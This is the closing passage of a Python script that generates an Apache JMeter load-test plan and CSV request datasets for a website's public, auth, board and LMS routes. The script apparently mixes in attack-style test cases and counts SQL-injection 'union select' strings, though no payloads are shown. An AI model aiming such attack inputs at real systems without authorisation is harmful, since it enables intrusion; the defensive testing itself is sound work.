      <elementProp name="TestPlan.user_defined_variables" elementType="Arguments" guiclass="ArgumentsPanel" testclass="Arguments" testname="User Defined Variables" enabled="true">
        <collectionProp name="Arguments.arguments" />
      </elementProp>
      <stringProp name="TestPlan.user_define_classpath"></stringProp>
    </TestPlan>
    <hashTree>
{setup_group_xml()}
{generic_thread_group_xml("Public Route Mixed Thread Group", "public_route_csv", "fullsite-public-route-mixed-100.csv", "public_route_loops", "public_route_base_delay_ms", 500, "public_route_random_delay_ms", 400, "Normal public browsing, public support creation, ambiguous public queries, and simple public URL typos.", "Public Route Mixed")}
{generic_thread_group_xml("Auth Mixed Thread Group", "auth_mixed_csv", "fullsite-auth-mixed-100.csv", "auth_mixed_loops", "auth_mixed_base_delay_ms", 400, "auth_mixed_random_delay_ms", 300, "Registration, login, refresh, logout, profile reads, and auth attack attempts. Includes sequential dynamic session rows.", "Auth Mixed")}
{generic_thread_group_xml("Board Mixed Thread Group", "board_mixed_csv", "fullsite-board-mixed-100.csv", "board_mixed_loops", "board_mixed_base_delay_ms", 650, "board_mixed_random_delay_ms", 450, "Board search, detail reads, and sequential create/update/comment/delete chains with normal, ambiguous, and attack-like content.", "Board Mixed")}
{generic_thread_group_xml("LMS Mixed Thread Group", "lms_mixed_csv", "fullsite-lms-mixed-100.csv", "lms_mixed_loops", "lms_mixed_base_delay_ms", 700, "lms_mixed_random_delay_ms", 500, "Student, professor, and admin LMS coverage including assignment submissions, grading, enrollments, and permission checks.", "LMS Mixed")}
{generic_thread_group_xml("Secure Route Mixed Thread Group", "secure_route_csv", "fullsite-secure-route-mixed-100.csv", "secure_route_loops", "secure_route_base_delay_ms", 550, "secure_route_random_delay_ms", 350, "Authenticated route usage, typo variants, query typo cases, and explicit route/query attacks for board, auth, and LMS endpoints.", "Secure Route Mixed")}
      <ResultCollector guiclass="SimpleDataWriter" testclass="ResultCollector" testname="JTL Writer" enabled="true">
        <boolProp name="ResultCollector.error_logging">false</boolProp>
        <objProp>
          <name>saveConfig</name>
          <value class="SampleSaveConfiguration">
            <time>true</time>
            <latency>true</latency>
            <timestamp>true</timestamp>
            <success>true</success>
            <label>true</label>
            <code>true</code>
            <message>true</message>
            <threadName>true</threadName>
            <dataType>true</dataType>
            <encoding>false</encoding>
            <assertions>false</assertions>
            <subresults>false</subresults>
            <responseData>false</responseData>
            <samplerData>false</samplerData>
            <xml>false</xml>
            <fieldNames>true</fieldNames>
            <responseHeaders>false</responseHeaders>
            <requestHeaders>false</requestHeaders>
            <responseDataOnError>false</responseDataOnError>
            <saveAssertionResultsFailureMessage>false</saveAssertionResultsFailureMessage>
            <assertionsResultsToSave>0</assertionsResultsToSave>
            <bytes>true</bytes>
            <sentBytes>true</sentBytes>
            <url>true</url>
            <threadCounts>true</threadCounts>
            <idleTime>true</idleTime>
            <connectTime>true</connectTime>
          </value>
        </objProp>
        <stringProp name="filename">${{__P(result_file,FULLSITE_MIXED_500-results.jtl)}}</stringProp>
      </ResultCollector>
      <hashTree />
    </hashTree>
  </hashTree>
</jmeterTestPlan>
"""


def main() -> None:
    datasets = {
        "fullsite-public-route-mixed-100.csv": public_rows(),
        "fullsite-auth-mixed-100.csv": auth_rows(),
        "fullsite-board-mixed-100.csv": board_rows(),
        "fullsite-lms-mixed-100.csv": lms_rows(),
        "fullsite-secure-route-mixed-100.csv": secure_route_rows(),
    }

    total_main_rows = 0
    union_select_count = 0
    for filename, rows in datasets.items():
        write_csv(filename, rows)
        total_main_rows += len(rows)
        for item in rows:
            union_select_count += (item["request_path"] + " " + item["request_body"]).lower().count("union select")

    if total_main_rows != 500:
        raise SystemExit(f"Expected 500 main rows, found {total_main_rows}")
    if union_select_count > 5:
        raise SystemExit(f"Expected union-select style cases to stay minimal, found {union_select_count}")

    (OUT_DIR / "FULLSITE_MIXED_500.jmx").write_text(build_jmx(), encoding="utf-8")

    print("Generated:")
    for filename in datasets:
        print(f" - {filename}")
    print(" - FULLSITE_MIXED_500.jmx")
    print(f"Main rows: {total_main_rows}")
    print(f"Union-select occurrences: {union_select_count}")


if __name__ == "__main__":
    main()
